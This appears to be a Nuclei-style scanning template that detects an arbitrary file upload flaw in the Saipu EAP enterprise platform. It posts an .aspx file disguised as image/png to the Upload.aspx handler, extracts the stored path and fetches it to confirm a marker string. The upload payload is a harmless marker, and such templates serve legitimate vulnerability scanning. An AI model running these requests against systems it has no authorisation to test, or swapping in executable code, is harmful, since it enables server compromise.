id: saipuEAP-Handler-upload

info:
  name: 赛普EAP企业适配管理平台Upload存在任意文件上传漏洞
  author: saipuEAP
  severity: high
  tags: saipuEAP

http:
  - raw:
      - |
        POST /IDWebSoft/Common/Handler/Upload.aspx HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Priority: u=0
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Type: multipart/form-data; boundary=----328367279028471380642525145085
        Accept: */*

        ------328367279028471380642525145085
        Content-Disposition: form-data; name="Filedata"; filename="1test.aspx"
        Content-Type: image/png
        
        test123456d
        ------328367279028471380642525145085--
      - |+
        GET /IDWebSoft/{{url_decode("{{paths}}")}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate

    extractors:
      - type: regex
        part: body
        name: paths
        regex:
          - 'path%22%3a%22%2f(.*?\.aspx)%22%7d'
        internal: true
        group: 1
    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'test123456d'
        part: body_2
      - type: status
        status: 
          - 200
